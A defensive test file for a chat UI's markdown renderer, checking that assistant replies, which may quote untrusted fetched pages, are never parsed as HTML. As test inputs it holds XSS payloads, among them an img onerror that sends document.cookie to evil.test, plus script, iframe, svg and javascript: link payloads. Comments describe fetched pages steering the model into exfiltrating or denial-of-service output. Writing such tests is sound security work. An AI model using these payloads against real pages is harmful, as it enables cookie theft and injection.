import fs from 'node:fs';
import path from 'node:path';
import { fileURLToPath } from 'node:url';
import { describe, expect, it } from 'vitest';

/**
 * The assistant-reply markdown renderer (apps/web/static/index.html).
 *
 * The page is a single vanilla HTML file by design, so the renderer is
 * EXTRACTED VERBATIM from between its `md-render-start` / `md-render-end`
 * markers and evaluated against a deliberately hostile fake DOM. Two things
 * are being proven, and the second matters more than the first:
 *
 *   1. It formats what a model actually emits (headings, nested lists, bold,
 *      code, fences) and leaves everything else as literal text.
 *   2. It NEVER interprets its input as HTML. Since M10 an assistant reply can
 *      quote a web page the agent fetched, so this input is untrusted. The fake
 *      DOM below THROWS on innerHTML / outerHTML / insertAdjacentHTML, so a
 *      renderer that ever reached for one fails every test in this file rather
 *      than passing quietly against a permissive shim.
 */

const staticFile = path.resolve(
  path.dirname(fileURLToPath(import.meta.url)),
  '..',
  'static',
  'index.html',
);

/** The renderer's source, exactly as the browser will run it. */
function extractSource(): string {
  const html = fs.readFileSync(staticFile, 'utf8');
  // Each marker must be unique: a second occurrence anywhere in the page would
  // silently shift the slice, and the whole suite would then be testing some
  // other code while still passing.
  for (const marker of ['// --- md-render-start', '// --- md-render-end']) {
    const count = html.split(marker).length - 1;
    if (count !== 1) throw new Error(`expected exactly one ${marker}, found ${count}`);
  }
  const start = html.indexOf('// --- md-render-start');
  const end = html.indexOf('// --- md-render-end');
  if (end < start) throw new Error('md-render markers are out of order');
  return html.slice(start, end);
}

/** Executable source only: line and block comments removed. */
function stripComments(src: string): string {
  return src.replace(/\/\*[\s\S]*?\*\//g, '').replace(/^[ \t]*\/\/.*$/gm, '');
}

// --- the hostile fake DOM -------------------------------------------------

/**
 * The complete vocabulary the renderer is allowed to construct. Anything else
 * is a test failure: an adversarial review showed that a renderer additively
 * emitting `img.src = <model-controlled url>` passed a shim that only forbade
 * innerHTML and anchors — a model-controlled outbound GET from an unlocked
 * vault UI, which is precisely the exfiltration shape M10c exists to stop.
 * So the allowlist covers both the TAGS and the PROPERTIES, not just the
 * obviously dangerous ones.
 */
const ALLOWED_TAGS = [
  '#text', 'div', 'p', 'strong', 'em', 'code', 'pre', 'ul', 'ol', 'li', 'hr', 'span',
];
const ALLOWED_PROPS = ['tag', 'className', 'start', 'textContent', 'children', 'text', 'isText'];

class FakeNode {
  tag: string;
  className = '';
  start?: number; // ordered-list start, the one non-text property the renderer sets
  children: FakeNode[] = [];
  private text = '';
  readonly isText: boolean;

  constructor(tag: string, text?: string) {
    this.tag = tag;
    this.isText = tag === '#text';
    if (text !== undefined) this.text = text;
  }

  get lastChild(): FakeNode | null {
    return this.children.length ? this.children[this.children.length - 1]! : null;
  }

  appendChild(n: FakeNode): FakeNode {
    this.children.push(n);
    return n;
  }

  get textContent(): string {
    return this.isText ? this.text : this.children.map((c) => c.textContent).join('');
  }

  set textContent(v: string) {
    this.children = [];
    if (v !== '') this.children.push(new FakeNode('#text', v));
  }

  // Any HTML-parsing path is a test failure, not a stylistic complaint.
  set innerHTML(_v: string) {
    throw new Error('renderer touched innerHTML — model text must never be parsed as HTML');
  }
  set outerHTML(_v: string) {
    throw new Error('renderer touched outerHTML — model text must never be parsed as HTML');
  }
  insertAdjacentHTML(): never {
    throw new Error('renderer called insertAdjacentHTML — model text must never be parsed as HTML');
  }
}

/**
 * Wrap a node so that writing ANY property outside the allowlist throws. This
 * catches URL- and code-bearing sinks the innerHTML ban never sees: src, href,
 * srcdoc, style, onclick, and anything else a future edit might reach for.
 */
function guard(node: FakeNode): FakeNode {
  return new Proxy(node, {
    set(target, prop, value) {
      if (typeof prop === 'string' && !ALLOWED_PROPS.includes(prop)) {
        throw new Error(
          `renderer set "${prop}" on <${target.tag}> — only ${ALLOWED_PROPS.join(', ')} are allowed`,
        );
      }
      return Reflect.set(target, prop, value);
    },
  });
}

const fakeDocument = {
  createElement: (tag: string) => {
    if (!ALLOWED_TAGS.includes(tag)) {
      throw new Error(`renderer created <${tag}>, which is outside its allowed vocabulary`);
    }
    return guard(new FakeNode(tag));
  },
  createTextNode: (text: string) => guard(new FakeNode('#text', text)),
  write: () => {
    throw new Error('renderer called document.write');
  },
};

type Renderer = (container: FakeNode, text: unknown) => void;

function loadRenderer(): Renderer {
  const factory = new Function(
    'document',
    `${extractSource()}\n;return renderMarkdown;`,
  ) as (doc: unknown) => Renderer;
  return factory(fakeDocument);
}

const renderMarkdown = loadRenderer();

/** Compact tree serialization: tag.class(children) — text nodes as "quoted". */
function ser(n: FakeNode): string {
  if (n.isText) return JSON.stringify(n.textContent);
  const cls = n.className ? '.' + n.className.replace(/ /g, '.') : '';
  const start = n.start === undefined ? '' : `@${n.start}`;
  return `${n.tag}${cls}${start}(${n.children.map(ser).join(' ')})`;
}

/** Render into a fresh bubble and return [tree, serialized]. */
function render(src: string): { root: FakeNode; out: string; text: string } {
  const bubble = new FakeNode('div');
  renderMarkdown(bubble, src);
  return { root: bubble, out: ser(bubble), text: bubble.textContent };
}

/** Every element tag present in the rendered tree. */
function tags(n: FakeNode, acc: string[] = []): string[] {
  if (!n.isText) acc.push(n.tag);
  for (const c of n.children) tags(c, acc);
  return acc;
}

// --- the injection surface (the reason this file exists) ------------------

describe('renderer never interprets its input as HTML', () => {
  it('has no HTML-parsing API anywhere in its source', () => {
    // A static guard that survives shim drift: even if the fake DOM above were
    // weakened, this fails on the source text itself. Comments are stripped
    // first — the block's header explains at length why it never touches
    // innerHTML, and that prose must not read as a violation of itself.
    const src = stripComments(extractSource());
    for (const banned of [
      'innerHTML',
      'outerHTML',
      'insertAdjacentHTML',
      'document.write',
      'createContextualFragment',
      'srcdoc',
      'eval(',
      'new Function',
    ]) {
      expect(src, `renderer source must not contain ${banned}`).not.toContain(banned);
    }
  });

  it('contains nothing that could close the page script element', () => {
    // The renderer lives INSIDE the page's single <script> element. A literal
    // closing tag anywhere in it — even inside a comment — makes the HTML
    // parser end the script there and takes the WHOLE app down with it. This
    // actually happened while building the renderer, and no amount of DOM
    // testing catches it, because these tests evaluate extracted source rather
    // than parsing HTML. Hence a flat text assertion.
    expect(extractSource().toLowerCase()).not.toContain('</script');
    const html = fs.readFileSync(staticFile, 'utf8');
    expect(html.match(/<script/gi) ?? []).toHaveLength(1);
    expect(html.match(/<\/script/gi) ?? []).toHaveLength(1);
  });

  it('renders a script tag as visible text, not an element', () => {
    const { out, text } = render('Here: <script>alert(1)</script> done');
    expect(tags(render('<script>alert(1)</script>').root)).not.toContain('script');
    expect(text).toContain('<script>alert(1)</script>');
    expect(out).toContain(JSON.stringify('Here: <script>alert(1)</script> done'));
  });

  it('renders an img onerror payload as text', () => {
    const payload = '<img src=x onerror="fetch(\'https://evil.test/?v=\'+document.cookie)">';
    const { root, text } = render(payload);
    expect(tags(root)).not.toContain('img');
    expect(text).toBe(payload);
  });

  it('never emits an anchor, even for a javascript: URL', () => {
    const { root, text } = render('[click me](javascript:alert(1))');
    expect(tags(root)).not.toContain('a');
    // The label renders; the scheme is visible as inert text, not a target.
    expect(text).toContain('click me');
  });

  it('renders an ordinary link as text plus a plain URL, with no anchor', () => {
    const { root, out, text } = render('See [the docs](https://example.com/x) here');
    expect(tags(root)).not.toContain('a');
    expect(text).toBe('See the docs (https://example.com/x) here');
    expect(out).toContain('span.mdurl');
    expect(out).not.toContain('href');
  });

  it('puts every scrap of a hostile reply into text nodes only', () => {
    const nasty =
      '<iframe srcdoc="<script>x</script>"></iframe>\n\n' +
      '<svg onload=alert(1)>\n\n' +
      '</div><style>body{display:none}</style>';
    const { root, text } = render(nasty);
    const emitted = new Set(tags(root));
    // Only our own construction vocabulary may appear.
    for (const t of emitted) {
      expect(['div', 'p', 'strong', 'em', 'code', 'pre', 'ul', 'ol', 'li', 'hr', 'span']).toContain(t);
    }
    for (const fragment of ['<iframe', '<svg', '<style', 'srcdoc']) {
      expect(text).toContain(fragment);
    }
  });
});

// --- formatting the model actually emits ----------------------------------

describe('block formatting', () => {
  it('renders paragraphs and keeps line breaks inside one', () => {
    const { root, out } = render('first line\nsecond line\n\nnew paragraph');
    expect(tags(root)).toEqual(['div', 'div', 'p', 'p']);
    expect(out).toContain('p.mdp("first line\\nsecond line")'); // break kept inside
    expect(out).toContain('p.mdp("new paragraph")');
  });

  it('renders headings as styled divs, never real h1-h6 elements', () => {
    const { root, out } = render('### Additional Recommendations');
    // Real headings inside a chat bubble would corrupt the page outline for
    // screen readers, so the weight is carried by classes.
    for (const h of ['h1', 'h2', 'h3', 'h4', 'h5', 'h6']) expect(tags(root)).not.toContain(h);
    expect(out).toBe('div(div.md(div.mdh.mdh3("Additional Recommendations")))');
  });

  it('renders the exact shape a web-search answer comes back in', () => {
    // Straight from the live acceptance run: numbered products, indented
    // sub-bullets, bold labels.
    const src = [
      '2. **Ninja Professional FP960 Power Blender**',
      '   - **Rating**: Very Good',
      '   - **Price Range**: Around $150-$200',
      '',
      '### Additional Recommendations',
    ].join('\n');
    const { out, text } = render(src);
    // "2." stays 2 — an <ol> silently restarting at 1 would misstate the reply.
    expect(out).toContain('ol.mdlist@2(li(strong("Ninja Professional FP960 Power Blender")');
    // The sub-bullets nest INSIDE the numbered item, not as a sibling list.
    expect(out).toContain('li(strong("Ninja Professional FP960 Power Blender") ul.mdlist(');
    expect(out).toContain('li(strong("Rating") ": Very Good")');
    expect(out).toContain('div.mdh.mdh3("Additional Recommendations")');
    // No stray markdown characters survive anywhere in the visible text.
    expect(text).not.toContain('**');
    expect(text).not.toContain('###');
  });

  it('nests, unnests, and switches marker type', () => {
    const { out } = render(['- a', '  - a1', '  - a2', '- b', '1. one'].join('\n'));
    // The child list lives INSIDE its parent <li> (correct nesting), the
    // unnested item follows as a sibling, and the marker switch opens an <ol>.
    expect(out).toBe(
      'div(div.md(' +
        'ul.mdlist(li("a" ul.mdlist(li("a1") li("a2"))) li("b")) ' +
        'ol.mdlist(li("one"))' +
        '))',
    );
  });

  it('keeps one list across the blank lines between items', () => {
    // A "loose" list. Breaking the run here would open a second <ol> and
    // renumber the second item back to 1 — changing what the reply says.
    const { out } = render(['1. first', '   - detail', '', '2. second'].join('\n'));
    expect(out.match(/ol\.mdlist/g) ?? []).toHaveLength(1);
    expect(out).toContain('li("second")');
  });

  it('resumes an ordered list at the number the reply used', () => {
    const { root, out } = render('3. Breville BSB600XL');
    expect(out).toContain('ol.mdlist@3(');
    expect(root.children[0]!.children[0]!.start).toBe(3);
  });

  it('does not set a start on a list that begins at one', () => {
    expect(render('1. one\n2. two').out).toContain('ol.mdlist(');
    expect(render('1. one\n2. two').root.children[0]!.children[0]!.start).toBeUndefined();
  });

  it('renders a fenced code block with its contents literal', () => {
    const { out } = render('```js\nconst x = **not bold**;\n```');
    expect(out).toBe('div(div.md(pre.mdpre(code("const x = **not bold**;"))))');
  });

  it('treats an unterminated fence as an in-progress code block', () => {
    const { out } = render('```\nhalf a block');
    expect(out).toBe('div(div.md(pre.mdpre(code("half a block"))))');
  });

  it('renders a horizontal rule', () => {
    expect(render('a\n\n---\n\nb').out).toBe(
      'div(div.md(p.mdp("a") hr() p.mdp("b")))',
    );
  });

  it('leaves a pipe table readable as literal text', () => {
    // Tables are out of scope (KNOWN-LIMITS); the fallback must be plain, not mangled.
    const src = '| Blender | Price |\n| --- | --- |\n| Ninja | $150 |';
    expect(render(src).text).toBe(src);
  });
});

describe('inline formatting', () => {
  it('renders bold, italic, and code', () => {
    expect(render('**b** and *i* and `c`').out).toBe(
      'div(div.md(p.mdp(strong("b") " and " em("i") " and " code.mdcode("c"))))',
    );
  });

  it('lets code spans win over emphasis inside them', () => {
    expect(render('`**not bold**`').out).toBe(
      'div(div.md(p.mdp(code.mdcode("**not bold**"))))',
    );
  });

  it('leaves unterminated emphasis as literal characters', () => {
    expect(render('a ** dangling and _also').text).toBe('a ** dangling and _also');
  });

  it('does not treat snake_case or a bare asterisk as emphasis boundaries', () => {
    // Real model output is full of identifiers; italicizing them would be wrong.
    expect(render('call some_long_name(x) * 2').text).toBe('call some_long_name(x) * 2');
  });

  it('never eats characters out of identifiers, globs, or kwargs', () => {
    // Every one of these deletes characters under CommonMark's rules or under
    // a naive pattern. In a product whose whole claim is fidelity, a reply that
    // quietly loses text is a correctness bug, not a formatting nit.
    for (const src of [
      'Define the __init__ method.',
      'if __name__ == "__main__": run()',
      'Use __all__ and __slots__ here',
      'the *args and **kwargs pattern',
      'run *.md and *.txt through it',
      '**bold ** x',
      'call some_long_name(x) * 2',
      'a MAX_TOKENS constant',
    ]) {
      expect(render(src).text, src).toBe(src);
    }
  });

  it('renders ***both*** as bold italic', () => {
    expect(render('***important***').out).toBe(
      'div(div.md(p.mdp(strong(em("important")))))',
    );
  });

  it('honors a backslash escape instead of formatting it', () => {
    // The model wrote \\* to SHOW an asterisk; italicizing it says the opposite.
    expect(render('a \\*not italic\\* b').text).toBe('a *not italic* b');
    expect(tags(render('a \\*not italic\\* b').root)).not.toContain('em');
  });

  it('consumes the backslash of an escape, which costs a Windows path one', () => {
    // The documented tradeoff (KNOWN-LIMITS): honoring escapes is the right
    // call — without it, "\*" renders as italics AND a stray backslash, which
    // is wrong twice — but it means a literal backslash before a markup
    // character is dropped. Paths in replies normally arrive in `code spans`,
    // where nothing is interpreted at all.
    expect(render('C:\\path\\*.txt').text).toBe('C:\\path*.txt');
    expect(render('`C:\\path\\*.txt`').text).toBe('C:\\path\\*.txt'); // untouched in code
  });

  it('keeps a trailing hash in a heading', () => {
    expect(render('## What is C#').out).toBe('div(div.md(div.mdh.mdh2("What is C#")))');
    expect(render('### Title ###').out).toBe('div(div.md(div.mdh.mdh3("Title")))');
  });

  it('leaves an image construct entirely literal', () => {
    // KNOWN-LIMITS promises this, and a remote image would be an outbound
    // request the model chose, from an unlocked vault UI.
    const src = '![a screenshot](https://evil.test/beacon.png)';
    const { root, text } = render(src);
    expect(text).toBe(src);
    expect(tags(root)).not.toContain('img');
  });

  it('does not turn a thematic break inside a list into a bullet', () => {
    const { out } = render('- a\n* * *\n- b');
    expect(out).toContain('hr()');
    expect(render('- a\n* * *\n- b').text).not.toContain('* *');
  });

  it('splits paragraphs on a lone carriage return', () => {
    expect(tags(render('a\r\rb').root)).toEqual(['div', 'div', 'p', 'p']);
  });

  it('handles bold containing code', () => {
    expect(render('**bold `code` here**').out).toBe(
      'div(div.md(p.mdp(strong("bold " code.mdcode("code") " here"))))',
    );
  });
});

describe('robustness', () => {
  it('clears whatever the container held first', () => {
    const bubble = new FakeNode('div');
    bubble.appendChild(new FakeNode('span', 'Thinking…'));
    renderMarkdown(bubble, 'answer');
    expect(bubble.textContent).toBe('answer');
    expect(ser(bubble)).toBe('div(div.md(p.mdp("answer")))');
  });

  it('renders empty and non-string input without throwing', () => {
    expect(render('').out).toBe('div(div.md())');
    const bubble = new FakeNode('div');
    expect(() => renderMarkdown(bubble, undefined)).not.toThrow();
    expect(bubble.textContent).toBe('');
  });

  it('falls back to plain text beyond the length guard', () => {
    const huge = '**x** '.repeat(40000); // > 200k chars
    const { root, text } = render(huge);
    expect(tags(root)).not.toContain('strong'); // unparsed, just text
    expect(text).toBe(huge);
  });

  it('does not recurse without bound on deeply nested emphasis', () => {
    const deep = '*'.repeat(60) + 'x' + '*'.repeat(60);
    expect(() => render(deep)).not.toThrow();
  });

  it('finishes pathological emphasis input quickly', () => {
    // Guards against catastrophic backtracking on hostile fetched-page text.
    const evil = '*'.repeat(5000) + 'a'.repeat(5000);
    const started = process.hrtime.bigint();
    render(evil);
    const ms = Number(process.hrtime.bigint() - started) / 1e6;
    expect(ms).toBeLessThan(2000);
  });

  it('stays fast on a reply engineered to be quadratic', () => {
    // An adversarial review froze an earlier version of this renderer for ~12
    // SECONDS on this exact input, sized just under the length guard: thousands
    // of unmatched delimiters, each scanning the rest of the reply for a closer
    // that never comes. A fetched page can talk the model into echoing one, and
    // the main thread has no way to cancel. Emphasis content is now bounded so
    // an unmatched delimiter can only scan to the next one.
    for (const unit of [' __a', ' _a', ' *a', 'a __b', ' **a']) {
      const evil = unit.repeat(Math.floor(199_000 / unit.length));
      const started = process.hrtime.bigint();
      render(evil);
      const ms = Number(process.hrtime.bigint() - started) / 1e6;
      expect(ms, `${JSON.stringify(unit)} x ${evil.length} chars took ${ms}ms`).toBeLessThan(500);
    }
  });
});
